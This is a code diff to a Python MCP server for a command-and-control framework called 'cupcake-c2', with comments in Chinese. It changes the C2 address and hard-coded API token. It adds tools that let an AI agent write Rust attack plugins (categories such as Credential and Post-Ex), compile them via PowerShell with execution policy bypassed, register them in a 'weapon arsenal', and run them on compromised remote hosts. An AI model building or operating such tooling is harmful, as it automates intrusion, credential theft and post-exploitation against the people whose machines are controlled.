@@ -8,8 +8,8 @@ import mcp.types as types
 from mcp.server.stdio import stdio_server
 
 # --- C2 设置 ---
-C2_SERVER = "http://192.168.2.134:9999"
-API_TOKEN = "Qk2KIEy8Yh6BlHW7u369guS1aJRSe4.r"
+C2_SERVER = "http://127.0.0.1:9999/"
+API_TOKEN = "lSYJZK-.5K.MCrgvOe0PDjY9ryWRJNX3"
 
 # 初始化原生 MCP 服务器 (无 FastMCP 噪音)
 server = Server("cupcake-c2", version="1.0.0")
@@ -82,6 +82,58 @@ async def handle_list_tools() -> list[types.Tool]:
                 },
                 "required": ["uuid"]
             },
+        ),
+        types.Tool(
+            name="register_wasm_plugin",
+            description="[AI专用] 自动编写、编译并注册一个新的 Wasm 插件到 C2 武器库",
+            inputSchema={
+                "type": "object",
+                "properties": {
+                    "id": {"type": "string", "description": "插件唯一 ID (如: port-scan)"},
+                    "name": {"type": "string", "description": "插件显示名称"},
+                    "description": {"type": "string", "description": "插件功能描述"},
+                    "rust_code": {"type": "string", "description": "Rust 源码 (lib.rs 内容)"},
+                    "category": {"type": "string", "description": "分类 (Discovery/Credential/Post-Ex)", "default": "Discovery"},
+                    "params": {
+                        "type": "array",
+                        "items": {
+                            "type": "object",
+                            "properties": {
+                                "name": {"type": "string"},
+                                "description": {"type": "string"},
+                                "type": {"type": "string", "enum": ["string", "int", "bool"]},
+                                "default": {"type": ["string", "number", "boolean"]}
+                            }
+                        },
+                        "description": "说明插件需要的 JSON 参数"
+                    }
+                },
+                "required": ["id", "name", "description", "rust_code"]
+            }
+        ),
+        types.Tool(
+            name="run_plugin",
+            description="在指定的受控端上运行武器库插件",
+            inputSchema={
+                "type": "object",
+                "properties": {
+                    "uuid": {"type": "string", "description": "受控端 UUID"},
+                    "plugin_id": {"type": "string", "description": "插件 ID"},
+                    "args": {"type": "string", "description": "插件参数 (Wasm 插件需输入 JSON 字符串)"}
+                },
+                "required": ["uuid", "plugin_id", "args"]
+            }
+        ),
+        types.Tool(
+            name="get_plugin_result",
+            description="获取插件执行结果",
+            inputSchema={
+                "type": "object",
+                "properties": {
+                    "task_id": {"type": "string", "description": "任务 ID (RunPlugin 返回)"}
+                },
+                "required": ["task_id"]
+            }
         )
     ]
 
@@ -115,6 +167,64 @@ async def handle_call_tool(
     elif name == "get_history":
         uuid_val = arguments.get("uuid")
         res = c2_request("GET", f"/api/clients/history/{uuid_val}")
+        return [types.TextContent(type="text", text=res)]
+
+    elif name == "register_wasm_plugin":
+        import os, subprocess
+        p_id = arguments["id"]
+        rust_code = arguments["rust_code"]
+        
+        # 1. 写入源码
+        base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+        skill_dir = os.path.join(base_path, "Skills", p_id)
+        os.makedirs(skill_dir, exist_ok=True)
+        with open(os.path.join(skill_dir, "lib.rs"), "w", encoding="utf-8") as f:
+            f.write(rust_code)
+            
+        # 2. 调用 PowerShell 编译
+        try:
+            cmd = f'powershell.exe -ExecutionPolicy Bypass -File "{os.path.join(base_path, "build_v3_skill.ps1")}" {p_id}'
+            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=base_path)
+            if proc.returncode != 0:
+                return [types.TextContent(type="text", text=f"编译失败:\n{proc.stderr}")]
+        except Exception as e:
+            return [types.TextContent(type="text", text=f"执行编译脚本出错: {str(e)}")]
+            
+        # 3. 更新 Manifest
+        manifest_path = os.path.join(base_path, "server", "assets", "plugins", "manifest.json")
+        try:
+            with open(manifest_path, "r", encoding="utf-8") as f:
+                manifest = json.load(f)
+            
+            # 检查是否已存在
+            manifest = [p for p in manifest if p["id"] != p_id]
+            
+            new_entry = {
+                "id": p_id,
+                "name": arguments["name"],
+                "description": arguments["description"],
+                "file_name": f"{p_id}.wasm",
+                "type": "wasm-skill",
+                "category": arguments.get("category", "Discovery"),
+                "required_os": "windows",
+                "params": arguments.get("params", [])
+            }
+            manifest.append(new_entry)
+            
+            with open(manifest_path, "w", encoding="utf-8") as f:
+                json.dump(manifest, f, indent=2, ensure_ascii=False)
+                
+            return [types.TextContent(type="text", text=f"✅ 插件 {p_id} 编译并注册成功！")]
+        except Exception as e:
+            return [types.TextContent(type="text", text=f"更新 Manifest 失败: {str(e)}")]
+
+    elif name == "run_plugin":
+        res = c2_request("POST", "/api/plugins/run", json_data=arguments)
+        return [types.TextContent(type="text", text=res)]
+        
+    elif name == "get_plugin_result":
+        task_id = arguments.get("task_id")
+        res = c2_request("GET", f"/api/plugins/result/{task_id}")
         return [types.TextContent(type="text", text=res)]
         
     raise ValueError(f"Unknown tool: {name}")
